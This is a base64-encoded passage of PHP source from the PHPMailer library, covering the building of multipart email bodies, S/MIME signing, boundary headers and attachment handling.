KTsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+SWNhbCwgJHRoaXMtPkVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmUnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzNdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVszXSwgJGJvZHlDaGFyU2V0LCAndGV4dC9odG1sJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVszXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHRoaXMtPkVuY29kaW5nID0gJGJvZHlFbmNvZGluZzsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkdGhpcy0+RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7DQogICAgICAgICAgICAkYm9keSA9ICcnOw0KICAgICAgICB9IGVsc2VpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRmaWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdtYWlsJyk7DQogICAgICAgICAgICAgICAgaWYgKGZhbHNlID09PSBAZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRib2R5KSkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzaWduaW5nJykgLiAnIENvdWxkIG5vdCB3cml0ZSB0ZW1wIGZpbGUnKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHNpZ25lZCA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnc2lnbmVkJyk7DQogICAgICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKCRmaWxlLCAkc2lnbmVkLCAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLCBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2tleV9maWxlKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzDQogICAgICAgICAgICAgICAgICAgICksIG51bGwpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRzaWduID0gQG9wZW5zc2xfcGtjczdfc2lnbigkZmlsZSwgJHNpZ25lZCwgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwgYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9rZXlfZmlsZSksDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcw0KICAgICAgICAgICAgICAgICAgICApLCBudWxsLCBQS0NTN19ERVRBQ0hFRCwgJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCRzaWduKSB7DQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJGZpbGUpOw0KICAgICAgICAgICAgICAgICAgICAkYm9keSA9IEBmaWxlX2dldF9jb250ZW50cygkc2lnbmVkKTsNCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkc2lnbmVkKTsNCiAgICAgICAgICAgICAgICAgICAgJHBhcnRzID0gZXhwbG9kZSgiXG5cbiIsICRib2R5LCAyKTsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHBhcnRzWzBdIC4gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICAgICAkYm9keSA9ICRwYXJ0c1sxXTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkc2lnbmVkKTsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gb3BlbnNzbF9lcnJvcl9zdHJpbmcoKSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAgICAgJGJvZHkgPSAnJzsNCiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRib2R5Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Qm91bmRhcnkoJGJvdW5kYXJ5LCAkY2hhclNldCwgJGNvbnRlbnRUeXBlLCAkZW5jb2RpbmcpIHsNCiAgICAgICAgJHJlc3VsdCA9ICcnOw0KICAgICAgICBpZiAoJGNoYXJTZXQgPT0gJycpIHsNCiAgICAgICAgICAgICRjaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjb250ZW50VHlwZSA9PSAnJykgew0KICAgICAgICAgICAgJGNvbnRlbnRUeXBlID0gJHRoaXMtPkNvbnRlbnRUeXBlOw0KICAgICAgICB9DQogICAgICAgIGlmICgkZW5jb2RpbmcgPT0gJycpIHsNCiAgICAgICAgICAgICRlbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJGJvdW5kYXJ5KTsNCiAgICAgICAgJHJlc3VsdCAuPSBzcHJpbnRmKCdDb250ZW50LVR5cGU6ICVzOyBjaGFyc2V0PSVzJywgJGNvbnRlbnRUeXBlLCAkY2hhclNldCk7DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOw0KICAgICAgICBpZiAoJGVuY29kaW5nICE9ICc3Yml0Jykgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICRlbmNvZGluZyk7DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEU7DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZW5kQm91bmRhcnkoJGJvdW5kYXJ5KSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+TEUgLiAnLS0nIC4gJGJvdW5kYXJ5IC4gJy0tJyAuICR0aGlzLT5MRTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldE1lc3NhZ2VUeXBlKCkgew0KICAgICAgICAkdHlwZSA9IGFycmF5KCk7DQogICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgew0KICAgICAgICAgICAgJHR5cGVbXSA9ICdhbHQnOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+aW5saW5lSW1hZ2VFeGlzdHMoKSkgew0KICAgICAgICAgICAgJHR5cGVbXSA9ICdpbmxpbmUnOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+YXR0YWNobWVudEV4aXN0cygpKSB7DQogICAgICAgICAgICAkdHlwZVtdID0gJ2F0dGFjaCc7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9IGltcGxvZGUoJ18nLCAkdHlwZSk7DQogICAgICAgIGlmICgkdGhpcy0+bWVzc2FnZV90eXBlID09ICcnKSB7DQogICAgICAgICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gJ3BsYWluJzsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaGVhZGVyTGluZSgkbmFtZSwgJHZhbHVlKSB7DQogICAgICAgIHJldHVybiAkbmFtZSAuICc6ICcgLiAkdmFsdWUgLiAkdGhpcy0+TEU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiB0ZXh0TGluZSgkdmFsdWUpIHsNCiAgICAgICAgcmV0dXJuICR2YWx1ZSAuICR0aGlzLT5MRTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZEF0dGFjaG1lbnQoJHBhdGgsICRuYW1lID0gJycsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICcnLCAkZGlzcG9zaXRpb24gPSAnYXR0YWNobWVudCcpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghQGlzX2ZpbGUoJHBhdGgpKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkdHlwZSA9PSAnJykgew0KICAgICAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOw0KICAgICAgICAgICAgaWYgKCRuYW1lID09ICcnKSB7DQogICAgICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgMCA9PiAkcGF0aCwNCiAgICAgICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwNCiAgICAgICAgICAgICAgICAyID0+ICRuYW1lLA0KICAgICAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLA0KICAgICAgICAgICAgICAgIDQgPT4gJHR5cGUsDQogICAgICAgICAgICAgICAgNSA9PiBmYWxzZSwNCiAgICAgICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgICAgICA3ID0+IDANCiAgICAgICAgICAgICk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRBdHRhY2htZW50cygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hdHRhY2htZW50Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYXR0YWNoQWxsKCRkaXNwb3NpdGlvbl90eXBlLCAkYm91bmRhcnkpIHsNCiAgICAgICAgJG1pbWUgICAgPSBhcnJheSgpOw0KICAgICAgICAkY2lkVW5pcSA9IGFycmF5KCk7DQogICAgICAgICRpbmNsICAgID0gYXJyYXkoKTsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsNCiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAkZGlzcG9zaXRpb25fdHlwZSkgew0KICAgICAgICAgICAgICAgICRzdHJpbmcgID0gJyc7DQogICAgICAgICAgICAgICAgJHBhdGggICAgPSAnJzsNCiAgICAgICAgICAgICAgICAkYlN0cmluZyA9ICRhdHRhY2htZW50WzVdOw0KICAgICAgICAgICAgICAgIGlmICgkYlN0cmluZykgew0KICAgICAgICAgICAgICAgICAgICAkc3RyaW5nID0gJGF0dGFjaG1lbnRbMF07DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhdGggPSAkYXR0YWNobWVudFswXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGluY2xoYXNoID0gbWQ1KHNlcmlhbGl6ZSgkYXR0YWNobWVudCkpOw0KICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkaW5jbGhhc2gsICRpbmNsKSkgew0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGluY2xbXSAgICAgID0gJGluY2xoYXNoOw0KICAgICAgICAgICAgICAgICRuYW1lICAgICAgICA9ICRhdHRhY2htZW50WzJdOw0KICAgICAgICAgICAgICAgICRlbmNvZGluZyAgICA9ICRhdHRhY2htZW50WzNdOw0KICAgICAgICAgICAgICAgICR0eXBlICAgICAgICA9ICRhdHRhY2htZW50WzRdOw0KICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiA9ICRhdHRhY2htZW50WzZdOw0KICAgICAgICAgICAgICAgICRjaWQgICAgICAgICA9ICRhdHRhY2htZW50WzddOw0KICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScgJiYgYXJyYXlfa2V5X2V4aXN0cygkY2lkLCAkY2lkVW5pcSkpIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjaWRVbmlxWyRjaWRdID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAkbWltZVtdICAgICAgICA9IHNwcmludGYoJy0tJXMlcycsICRib3VuZGFyeSwgJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRuYW1lKSkgew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1UeXBlOiAlczsgbmFtZT0iJXMiJXMnLCAkdHlwZSwgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSksICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtVHlwZTogJXMlcycsICR0eXBlLCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJGVuY29kaW5nICE9ICc3Yml0Jykgew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogJXMlcycsICRlbmNvZGluZywgJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJykgew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1JRDogPCVzPiVzJywgJGNpZCwgJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCEoZW1wdHkoJGRpc3Bvc2l0aW9uKSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpOw0KICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnL1sgXChcKTw+QCw7OlxcIlwvXFtcXVw/PV0vJywgJGVuY29kZWRfbmFtZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9IiVzIiVzJywgJGRpc3Bvc2l0aW9uLCAkZW5jb2RlZF9uYW1lLCAkdGhpcy0+TEUgLiAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkZW5jb2RlZF9uYW1lKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9JXMlcycsICRkaXNwb3NpdGlvbiwgJGVuY29kZWRfbmFtZSwgJHRoaXMtPkxFIC4gJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzJXMnLCAkZGlzcG9zaXRpb24sICR0aGlzLT5MRSAuICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHN0cmluZywgJGVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5pc0Vycm9yKCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+ZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5pc0Vycm9yKCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkbWltZVtdID0gc3ByaW50ZignLS0lcy0tJXMnLCAkYm91bmRhcnksICR0aGlzLT5MRSk7DQogICAgICAgIHJldHVybiBpbXBsb2RlKCcnLCAkbWltZSk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcgPSAnYmFzZTY0Jykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCFpc19yZWFkYWJsZSgkcGF0aCkpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX29wZW4nKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRtYWdpY19xdW90ZXMgPSBnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoKTsNCiAgICAgICAgICAgIGlmICgkbWFnaWNfcXVvdGVzKSB7DQogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMy4wJywgJzwnKSkgew0KICAgICAgICAgICAgICAgICAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoZmFsc2UpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAg